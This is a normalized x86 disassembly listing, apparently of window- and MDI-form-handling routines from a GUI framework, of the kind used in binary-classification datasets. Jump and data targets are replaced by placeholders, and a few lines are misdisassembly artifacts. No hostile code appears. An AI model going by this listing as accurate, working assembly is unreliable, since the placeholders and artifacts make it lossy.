mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44dd40
xor edx edx
jmp r-xdata
mov eax esi
call sub_462c74
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_464b18
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_4497bc
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44dd40
sub_464b5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4498c8
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_464bb0
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_446e44
sub_464be4
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_468754
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_468740
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_464c30
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_468754
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_468740
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_464c80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_41a474
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_464cb0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4507d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_468724
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_468724
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_464c80
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_468724
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_468710
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_41a5d0
call sub_403254
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_468710
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_468710
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_468710
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_464db4
push ebx
mov ebx eax
mov eax ebx
call sub_464dac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_42a88c
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_464ddc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_44dcf8
mov dl 0x1
mov eax esi
call sub_465140
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_4651bc
mov edx eax
mov eax esi
call sub_44a158
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_44de94
mov dl 0x1
mov eax esi
call sub_464160
sub_464e5c
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4507d8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_45a888
mov edi eax
mov eax ebp
call sub_4507d8
push eax
call DrawMenuBar
sub_464ed8
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_420094
xor edx edx
mov eax ebx
call sub_45c220
sub_464efc
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_464e5c
mov eax edx
mov edx ebx
call sub_420094
sub_464f24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4650ea
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_468754
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45ddd4
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_468740
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_420094
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_468740
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
mov eax ebx
call sub_450adc
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4507d8
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_464e5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4650f1
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
mov dl 0x1
mov eax ebx
call sub_465fe8
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4507d8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4507d8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4507d8
mov edx eax
mov eax esi
call sub_45ddd4
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call SetMenu
sub_46510c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4650f8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_465168
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_46515c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_4651d4
push ebx
mov ebx eax
mov eax ebx
call sub_44fdb8
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_4651bc
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4651bc
mov edx eax
mov eax ebx
call sub_44a158
mov edx 0xff00000f
mov eax ebx
call sub_44a158
pop ebx
retn
sub_465258
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4507d8
push eax
call ShowWindow
sub_465298
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_464cb0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_464cb0
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_468724
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_468710
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_464cb0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_468710
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_468724
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_468710
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_468414
push eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683f8
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683e0
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_468710
call sub_4683e0
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683e0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_46842c
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_468414
push eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683f8
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683e0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_46842c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_468414
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_468710
call sub_468414
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_468414
push eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683f8
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683e0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_46842c
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683e0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_46842c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_468414
push eax
mov edx esi
mov eax [ rw-data ]
call sub_468710
call sub_4683f8
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_4655ec
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_462aa8
mov edx esi
mov eax edi
call sub_467f90
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_46569b ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44d5c4
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44d5c4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4657fd
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_462ab8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
mov eax ebx
call sub_46615c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_4499bc
push eax
mov eax ebx
call sub_449a00
push eax
mov eax ebx
call sub_4507d8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406eac
mov [ ebx + 0x254 ] eax
push ebx
push sub_464748
call sub_421054
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_45a888
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4507d8
push eax
call SetWindowPos
jmp r-xdata
sub_46594a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_465a75
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_44d928
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_467e68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465a7c
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_465a84
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_44db94
push 0x0
mov eax ebx
call sub_4507d8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_465ac8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44e318
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4507d8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_465b2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_465bd4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465bdb
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov eax edi
call sub_461dc8
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403450
mov eax ebx
call sub_465ee4
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403450
test al al
jne r-xdata
sub_465be4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_44d27c
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_44d27c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_465b2c
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_465c2c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_465b2c
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_465c50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41a714
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41a64c
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41a714
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41a64c
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_465ec0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4507d8
mov dx 0xb000
call sub_461b90
test al al
jne r-xdata
call sub_4507d8
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_461b90
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ec7
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a8c
jmp r-xdata
call sub_403a8c
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44d27c
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4507d8
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_461b90
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44b16c
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
